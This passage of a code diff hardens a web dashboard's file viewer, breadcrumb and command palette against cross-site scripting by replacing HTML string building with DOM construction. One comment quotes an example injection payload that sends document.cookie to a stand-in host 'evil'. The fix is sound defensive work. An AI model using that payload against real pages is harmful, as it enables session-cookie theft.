+            const data = await apiJson(API + '/api/files?path=' + encodeURIComponent(fullPath));
+            renderFileTree(data.entries || [], childrenEl);
+          } catch (exc) {
+            childrenEl.textContent = '';
+            const msg = document.createElement('div');
+            msg.className = 'fe-entry';
+            msg.style.color = 'var(--err)';
+            msg.textContent = '⚠ ' + (exc.kind === 'degraded' ? 'Service degraded' : 'Access denied');
+            childrenEl.appendChild(msg);
           }
         } else {
           childrenEl.style.display = isCollapsed ? 'none' : 'block';
@@ -2108,18 +2499,37 @@ async function viewFile(path) {
   viewer.classList.add('open');
 
   try {
-    const r = await fetch(API + '/api/files/content?path=' + encodeURIComponent(path) + '&max_bytes=1048576');
-    if (!r.ok) throw 'Failed';
-    const data = await r.json();
+    const data = await apiJson(API + '/api/files/content?path=' + encodeURIComponent(path) + '&max_bytes=1048576', { timeoutMs: 15000 });
     if (data.is_image) {
-      body.innerHTML = `<img src="${data.data_uri}" alt="${esc(path)}">`;
+      // v8 did: body.innerHTML = `<img src="${data.data_uri}" alt="${esc(path)}">`
+      // with NO escaping on data_uri at all, straight from the file-content API.
+      // A value of `x" onerror="fetch('//evil/'+document.cookie)` closed the src
+      // attribute and injected an event handler. Two independent fixes now:
+      //   1. the value must match a base64 raster-image data: URI (no svg+xml)
+      //   2. it is assigned through the DOM, so there is no HTML string to break
+      body.textContent = '';
+      if (isSafeImageDataUri(data.data_uri)) {
+        const img = document.createElement('img');
+        img.src = data.data_uri;
+        img.alt = path;
+        body.appendChild(img);
+      } else {
+        const warn = document.createElement('div');
+        warn.style.color = 'var(--err)';
+        warn.textContent = 'Refused to render image: the API returned a data URI that is not a recognised base64 raster image.';
+        body.appendChild(warn);
+      }
     } else if (data.truncated) {
       body.textContent = data.content + '\n\n--- Content truncated (file too large) ---';
     } else {
       body.textContent = data.content;
     }
-  } catch {
-    body.innerHTML = '<div style="color:var(--err)">Failed to load file</div>';
+  } catch (exc) {
+    body.textContent = '';
+    const msg = document.createElement('div');
+    msg.style.color = exc.kind === 'degraded' ? 'var(--warn)' : 'var(--err)';
+    msg.textContent = 'Failed to load file (' + errLabel(exc) + ')';
+    body.appendChild(msg);
   }
 }
 
@@ -2129,13 +2539,11 @@ function copyPath(path) {
 
 async function copyFileContent(path) {
   try {
-    const r = await fetch(API + '/api/files/content?path=' + encodeURIComponent(path) + '&max_bytes=1048576');
-    if (!r.ok) throw 'Failed';
-    const data = await r.json();
+    const data = await apiJson(API + '/api/files/content?path=' + encodeURIComponent(path) + '&max_bytes=1048576', { timeoutMs: 15000 });
     await navigator.clipboard.writeText(data.content);
     toast('Content copied to clipboard', 'ok');
-  } catch {
-    toast('Failed to copy content', 'err');
+  } catch (exc) {
+    toast('Failed to copy content (' + errLabel(exc) + ')', 'err');
   }
 }
 
@@ -2149,16 +2557,36 @@ function navigateTo(path) {
   loadFiles(path);
 }
 
+// Built through the DOM with listeners. v8 interpolated each accumulated path
+// into onclick="navigateTo('...')" via esc(), which left `'` intact — and the
+// path segments here derive from directory names, so they are untrusted too.
 function updateBreadcrumb(path) {
   const bc = document.getElementById('fe-breadcrumb');
-  const parts = path.split('\\').filter(Boolean);
-  let html = `<span class="bc-item" onclick="navigateTo('C:\\\\')">C:</span>`;
+  bc.textContent = '';
+
+  const addCrumb = (label, target) => {
+    const span = document.createElement('span');
+    span.className = 'bc-item';
+    span.textContent = label;
+    span.addEventListener('click', () => navigateTo(target));
+    bc.appendChild(span);
+  };
+  const addSep = () => {
+    const sep = document.createElement('span');
+    sep.className = 'bc-sep';
+    sep.textContent = '›';
+    bc.appendChild(sep);
+  };
+
+  addCrumb('C:', 'C:\\');
   let buildPath = 'C:';
-  parts.forEach(p => {
+  path.split('\\').filter(Boolean).forEach((p, i) => {
+    // The first segment is the drive letter already rendered as the root crumb.
+    if (i === 0 && /^[A-Za-z]:$/.test(p)) return;
     buildPath += '\\' + p;
-    html += `<span class="bc-sep">›</span><span class="bc-item" onclick="navigateTo('${esc(buildPath)}')">${esc(p)}</span>`;
+    addSep();
+    addCrumb(p, buildPath);
   });
-  bc.innerHTML = html;
 }
 
 function closeFileViewer() {
@@ -2192,12 +2620,30 @@ function renderCmdResults(query) {
   const q = query.toLowerCase();
   const filtered = cmds.filter(c => c.name.toLowerCase().includes(q));
   const results = document.getElementById('cmd-results');
-  results.innerHTML = filtered.map(c =>
-    `<div class="cmd-item" onclick="(${c.action.toString()})()">
-      <span>${esc(c.name)}</span>
-      ${c.key ? `<span class="cmd-item-key">${esc(c.key)}</span>` : ''}
-    </div>`
-  ).join('');
+
+  // v8 stringified each action function into an inline onclick and re-parsed it
+  // as code on every keystroke. The commands are hardcoded so it was not
+  // directly exploitable, but it made the whole page require 'unsafe-inline'
+  // script for no benefit. Bind the real function objects instead.
+  results.textContent = '';
+  filtered.forEach(c => {
+    const item = document.createElement('div');
+    item.className = 'cmd-item';
+
+    const name = document.createElement('span');
+    name.textContent = c.name;
+    item.appendChild(name);
+
+    if (c.key) {
+      const key = document.createElement('span');
+      key.className = 'cmd-item-key';
+      key.textContent = c.key;
+      item.appendChild(key);
+    }
+
+    item.addEventListener('click', c.action);
+    results.appendChild(item);
+  });
 }
 
 // ═══════════ THEMES ═══════════
@@ -2224,11 +2670,14 @@ function toggleTheme() {
 applyTheme(currentTheme);
 
 // ═══════════ UTILITIES ═══════════
-function esc(str) {
-  const d = document.createElement('div');
-  d.textContent = str;
-  return d.innerHTML;
-}
+// The old esc() lived here:
+//     function esc(str) { const d = document.createElement('div');
+//                         d.textContent = str; return d.innerHTML; }
+// Per the HTML serialisation spec that escapes only `&`, `<` and `>` in text
+// position — never `"`, `'` or backtick. It was nevertheless used inside
+// double-quoted HTML attributes and inside single-quoted JS string literals in
+// onclick handlers, where it neutralised nothing. Replaced by escHtml/escAttr
+// above, and every JS-code-context call site was converted to addEventListener.
 
 function toast(msg, type = '') {
   const container = document.getElementById('toast-container');
